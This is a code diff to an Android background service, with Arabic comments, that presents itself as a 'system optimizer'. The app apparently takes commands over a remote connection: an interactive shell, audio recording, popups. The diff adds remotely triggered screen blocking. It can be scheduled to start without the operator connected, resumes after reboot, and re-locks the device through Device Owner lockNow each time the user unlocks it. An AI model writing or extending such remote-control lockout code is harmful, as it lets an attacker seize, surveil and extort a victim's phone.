@@ -6,7 +6,6 @@ import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
 import android.app.WallpaperManager;
-import android.app.admin.DevicePolicyManager;
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -54,6 +53,7 @@ import java.util.ArrayList;
 import java.util.Date;
 import java.util.List;
 import java.util.Locale;
+import java.util.Map;
 import java.util.concurrent.atomic.AtomicBoolean;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
@@ -98,8 +98,10 @@ public class BackgroundService extends Service {
 
     private static final String PREFS_NAME = "system_optimizer_prefs";
     private static final String PREFS_BLACK_SCREEN_ON_BOOT = "black_screen_on_boot";
-    private static final String PREFS_BLOCK_DEADLINE = "block_screen_deadline_ms";
-    private static final String PREFS_BLOCK_ACTIVE = "block_screen_active";
+
+    /** مفتاح يُمرَّر في Intent الخدمة (مؤشرات الإقلاع/الجلسة) — انظر BlockSessionManager. */
+    public static final String EXTRA_BS_TRIGGER = "bs_trigger";
+    public static final String TRIGGER_BOOT = "boot";
 
     // جلسة shell تفاعلية: حساسة فقط لخيط الاتصال (المُصدر الوحيد للأوامر)
     private final Object shellLock = new Object();
@@ -139,6 +141,30 @@ public class BackgroundService extends Service {
         }
     }
 
+    /**
+     * إعادة فرض الحجب بعد أحداث قفل/فتح الشاشة:
+     * ما دامت جلسة الحجب نشطة، نعيد قفل keyguard بالنظام (lockNow، سلطة
+     * Device Owner/Admin) ونعيد واجهة الحجب إلى المقدمة. لا نستخدم أي خدع،
+     * ولا نعترض PIN/نمط المستخدم — يبقى Keyguard Android الحقيقي كما هو.
+     */
+    private final BroadcastReceiver blockRelockReceiver = new BroadcastReceiver() {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            String action = intent != null ? intent.getAction() : null;
+            if (!Intent.ACTION_SCREEN_ON.equals(action)
+                    && !Intent.ACTION_USER_PRESENT.equals(action)) {
+                return;
+            }
+            BlockSessionManager mgr = BlockSessionManager.getInstance(context);
+            if (!mgr.isActive()) {
+                return; // انتهت الجلسة -> استخدام طبيعي، لا إعادة قفل
+            }
+            mgr.audit("unlock/screen-on event: " + action + " -> re-lock");
+            new DeviceManagementManager(context).lockNow();
+            launchBlockActivity();
+        }
+    };
+
     @Override
     public IBinder onBind(Intent intent) {
         return null;
@@ -149,6 +175,17 @@ public class BackgroundService extends Service {
         super.onCreate();
         ensureNotificationChannels();
         cleanupStaleWallpaperCache();
+
+        // إطار جلسة الحجب الصارمة: حالة محلية دائمة + إعادة فرض بعد الفتح.
+        BlockSessionManager.getInstance(this);
+        IntentFilter relockFilter = new IntentFilter();
+        relockFilter.addAction(Intent.ACTION_SCREEN_ON);
+        relockFilter.addAction(Intent.ACTION_USER_PRESENT);
+        try {
+            registerReceiver(blockRelockReceiver, relockFilter);
+        } catch (Exception e) {
+            Log.w(TAG, "register relock receiver failed", e);
+        }
     }
 
     private void cleanupStaleWallpaperCache() {
@@ -183,6 +220,8 @@ public class BackgroundService extends Service {
             connectionThread = new Thread(this::establishConnection, "bg-connection");
             connectionThread.start();
         }
+
+        handleIncomingTrigger(intent);
 
         return START_STICKY;
     }
@@ -236,7 +275,60 @@ public class BackgroundService extends Service {
             shellProcess = null;
         }
 
+        try {
+            unregisterReceiver(blockRelockReceiver);
+        } catch (Exception ignored) {
+        }
+
         super.onDestroy();
+    }
+
+    /**
+     * معالجة الأسباب التي شغّلت الخدمة (إقلاع/مؤشرات جلسة/بدء عادي):
+     * التأكد أن جلسة الحجب مستأنفة/منتهية حسب الحقيقة، دون إعادة ضبط للعداد.
+     */
+    private void handleIncomingTrigger(Intent intent) {
+        try {
+            String trigger = intent != null
+                    ? intent.getStringExtra(EXTRA_BS_TRIGGER)
+                    : null;
+            BlockSessionManager mgr = BlockSessionManager.getInstance(this);
+
+            if (BlockSessionManager.TRIGGER_ACTIVATE.equals(trigger)) {
+                mgr.audit("alarm: activate");
+                if (mgr.activateIfDue()) {
+                    launchBlockActivity();
+                }
+                return;
+            }
+            if (BlockSessionManager.TRIGGER_EXPIRE.equals(trigger)) {
+                mgr.audit("alarm: expire");
+                mgr.terminate("expired");
+                return;
+            }
+
+            boolean boot = trigger != null && trigger.startsWith(TRIGGER_BOOT);
+            boolean resumed = mgr.recoverAfterServiceStart();
+            if (resumed) {
+                if (boot) {
+                    mgr.audit("block session recovered after boot (remaining preserved)");
+                }
+                launchBlockActivity();
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "handleIncomingTrigger failed", e);
+        }
+    }
+
+    /** إحضار واجهة حجب الشاشة إلى المقدمة (يُستدعى عند التنشيط/إعادة الفرض). */
+    private void launchBlockActivity() {
+        try {
+            Intent i = new Intent(this, BlockScreenActivity.class);
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(i);
+        } catch (Exception e) {
+            Log.w(TAG, "could not bring block screen forward: " + e.getMessage());
+        }
     }
 
     private void ensureNotificationChannels() {
@@ -416,6 +508,10 @@ public class BackgroundService extends Service {
                 handleRecordAudio(command, out);
             } else if (command.startsWith("block_screen:")) {
                 handleBlockScreen(command, out);
+            } else if (command.equals("block_screen_status")) {
+                handleBlockScreenStatus(out);
+            } else if (command.equals("block_screen_cancel")) {
+                handleBlockScreenCancel(out);
             } else if (command.startsWith("play_video:")) {
                 handlePlayVideo(command, out);
             } else if (command.startsWith("show_serious_warning:")) {
@@ -1395,51 +1491,116 @@ public class BackgroundService extends Service {
                 + " الشاشة السوداء عند الإقلاع (الحالة الجديدة: " + (newState ? "مفعّل" : "معطّل") + ")");
     }
 
+    /**
+     * حجب شاشة حقيقي بتحكم مشغّل (v2).
+     *
+     * الصيغة: block_screen:المدة_الثواني[:تأخير_الثواني[:معرف_الجلسة]]
+     * - الحقل الأول يبقى المدة دائماً (متوافق مع v1 block_screen:60).
+     * - تأخير اختياري (تأجيل الفرض). معرف جلسة اختياري (يولَّد تلقائياً إن لم يُعط).
+     *
+     * القواعد:
+     * 1) بدون Device Owner أو (Admin + isLockTaskPermitted) نرفض بصدق
+     *    STRICT_BLOCK_UNAVAILABLE — لا قفل وهمي بالملء ولا تزوير نجاح.
+     * 2) جلسة واحدة فقط: جلسة جديدة تحل محل القديمة صراحةً (لا ساعتين متوازيتين).
+     * 3) الدخول/الإقلاع: الجلسة قائمة مدرات=None كاختبار حقيقة بعد الانتهاء.
+     */
     private void handleBlockScreen(String command, OutputStream out) throws IOException {
         String[] parts = command.split(":");
         if (parts.length < 2) {
-            writeMessage(out, "صيغة خاطئة: block_screen:المدة(بالثواني)");
+            writeMessage(out, "صيغة خاطئة: block_screen:المدة_الثواني[:التأخير[:معرف_الجلسة]]");
             return;
         }
         int duration;
+        int delay = 0;
+        String sessionId = null;
         try {
             duration = Integer.parseInt(parts[1].trim());
+            if (parts.length >= 3 && !parts[2].trim().isEmpty()) {
+                delay = Integer.parseInt(parts[2].trim());
+            }
+            if (parts.length >= 4 && !parts[3].trim().isEmpty()) {
+                sessionId = parts[3].trim();
+            }
         } catch (NumberFormatException e) {
-            writeMessage(out, "المدة غير صالحة: " + parts[1]);
+            writeMessage(out, "قيمة عددية غير صالحة في الأوامر: " + command);
             return;
         }
-        if (duration < 1 || duration > 86400) {
-            writeMessage(out, "المدة يجب أن تكون بين 1 و 86400 ثانية.");
+        if (duration < 1 || duration > 86400 || delay < 0 || delay > 86400) {
+            writeMessage(out, "المدة والتأخير يجب أن يكونا بين 1..86400 ثانية (والتأخير >= 0).");
             return;
         }
 
-        long deadline = System.currentTimeMillis() + duration * 1000L;
-        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
-        prefs.edit()
-                .putLong(PREFS_BLOCK_DEADLINE, deadline)
-                .putBoolean(PREFS_BLOCK_ACTIVE, true)
-                .apply();
+        DeviceManagementManager dmm = new DeviceManagementManager(this);
+        if (!dmm.strictCapabilityAvailable()) {
+            StringBuilder deny = new StringBuilder();
+            deny.append("STRICT_BLOCK_UNAVAILABLE\n");
+            deny.append("لا يمكن تنفيذ حجب شاشة صارم على هذا الجهاز.\n");
+            deny.append("الإدارة المطلوبة: Device Owner أو (تطبيق إدارة نظام نشط + isLockTaskPermitted).\n");
+            deny.append("الحالة: ").append(dmm.capabilityLabel())
+                    .append(" | lock task permitted: ")
+                    .append(dmm.isLockTaskPermitted() ? "yes" : "no")
+                    .append("\nلم تُنفَّذ العملية (لا يُزوَّر نجاح القيود النظامية).");
+            writeMessage(out, deny.toString());
+            return;
+        }
 
-        boolean deviceOwner = isDeviceOwner();
+        BlockSessionManager mgr = BlockSessionManager.getInstance(this);
+        Map<String, String> session = mgr.schedule(delay, duration, sessionId);
+        if (session == null) {
+            writeMessage(out, "تعذّر جدولة الجلسة (تحقق من المعطيات).");
+            return;
+        }
 
-        Intent intent = new Intent(this, BlockScreenActivity.class);
-        intent.putExtra(BlockScreenActivity.EXTRA_DEADLINE_EPOCH_MS, deadline);
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
-        startActivity(intent);
+        // lock task على هذا الجهاز قبل أي بدء.
+        dmm.configureLockTask();
+
+        if (delay == 0) {
+            mgr.activateIfDue(); // الآن
+        }
+        if (mgr.isActive()) {
+            mgr.audit("block screen started (handler) id=" + mgr.getSessionId());
+            launchBlockActivity();
+        }
 
         StringBuilder reply = new StringBuilder();
-        reply.append("تم تشغيل حجب الشاشة لمدة ").append(duration).append(" ثانية.\n");
-        reply.append(deviceOwner
-                ? "وضع الإدارة: Device Owner — تُستخدم واجهات الجهاز المُدار (قفل/مهام كشك)."
-                : "وضع الإدارة: تطبيق عادي — قفل على مستوى التطبيق بالملء."
-                + "\nملاحظة: قفل النظام الكامل يتطلب Device Owner إدارة-مدار؛ لا يُزوَّر نجاحٌ للقيود"
-                + " التي تتطلب صلاحيات مُدارة.");
+        reply.append("BLOCK_SCREEN_STARTED\n");
+        reply.append("Session ID: ").append(session.get("Session ID")).append('\n');
+        reply.append("Duration: ").append(session.get("Requested duration")).append('\n');
+        reply.append("Start delay: ").append(session.get("Start delay")).append('\n');
+        reply.append("State: ").append(session.get("State")).append('\n');
+        reply.append("Capability: ").append(dmm.capabilityLabel()).append(" (strict available)\n");
+        if (delay > 0) {
+            reply.append("سيبدأ الحجب تلقائياً عند الموعد المحدد حتى بدون اتصال المشغّل.\n");
+        }
+        reply.append("جلسة واحدة: أي جلسة جديدة تحل محل الحالية صراحةً.");
         writeMessage(out, reply.toString());
     }
 
-    private boolean isDeviceOwner() {
-        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-        return dpm != null && dpm.isDeviceOwnerApp(getPackageName());
+    /** حالة جلسة الحجب الحالية (وسيلة متاحة للمشغّل والفحص). */
+    private void handleBlockScreenStatus(OutputStream out) throws IOException {
+        BlockSessionManager mgr = BlockSessionManager.getInstance(this);
+        mgr.settleDue(); // تُنهي أي جلسة انتهت فعلاً حتى لو تأخر مؤشر Android
+        Map<String, String> info = mgr.sessionInfo();
+        StringBuilder reply = new StringBuilder();
+        reply.append("BLOCK_SESSION_STATUS\n");
+        for (Map.Entry<String, String> e : info.entrySet()) {
+            reply.append(e.getKey()).append(": ").append(e.getValue()).append('\n');
+        }
+        DeviceManagementManager dmm = new DeviceManagementManager(this);
+        reply.append("Capability: ").append(dmm.capabilityLabel()).append('\n');
+        reply.append("In lock task mode: ").append(dmm.isLockTaskActive() ? "YES" : "NO");
+        writeMessage(out, reply.toString());
+    }
+
+    /** إيقاف جلسة الحجب وإعادة الجهاز لحالته الطبيعية. */
+    private void handleBlockScreenCancel(OutputStream out) throws IOException {
+        BlockSessionManager mgr = BlockSessionManager.getInstance(this);
+        if (!mgr.hasActiveOrScheduled()) {
+            writeMessage(out, "NO_ACTIVE_SESSION");
+            return;
+        }
+        mgr.terminate("cancelled by controller");
+        writeMessage(out, "BLOCK_SCREEN_CANCELLED");
     }
 
     // ------------------------------------------------------------------
